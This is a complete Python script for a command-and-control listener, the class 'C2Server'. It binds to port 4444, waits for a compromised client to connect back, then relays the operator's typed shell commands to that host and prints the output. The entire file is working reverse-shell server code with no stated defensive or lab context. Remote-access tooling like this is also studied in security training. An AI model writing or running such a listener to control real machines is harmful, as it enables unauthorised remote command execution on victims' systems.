import socket
import os

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connection = None
        self.client_info = None

    def print_banner(self):
        print("="*40)
        print("C2 SERVER LISTENING...")
        print("="*40)

    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.print_banner()
            print(f"[*] Waiting for connection on {self.host}:{self.port}...")
            self.connection, self.client_info = self.socket.accept()
            print(f"[+] Connected by {self.client_info}")
            self.command_loop()
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            self.cleanup()

    def command_loop(self):
        while True:
            try:
                command = input(f"{self.client_info[0]}> ").strip()
                if not command: continue
                if command.lower() in ['exit', 'quit']:
                    self.connection.send(b'exit')
                    break
                if command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue
                
                self.connection.send(command.encode())
                output = self.connection.recv(8192).decode('utf-8', errors='ignore')
                print(output)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break

    def cleanup(self):
        if self.connection: self.connection.close()
        if self.socket: self.socket.close()
        print("\n[*] Server closed.")

if __name__ == "__main__":
    server = C2Server()
    server.start()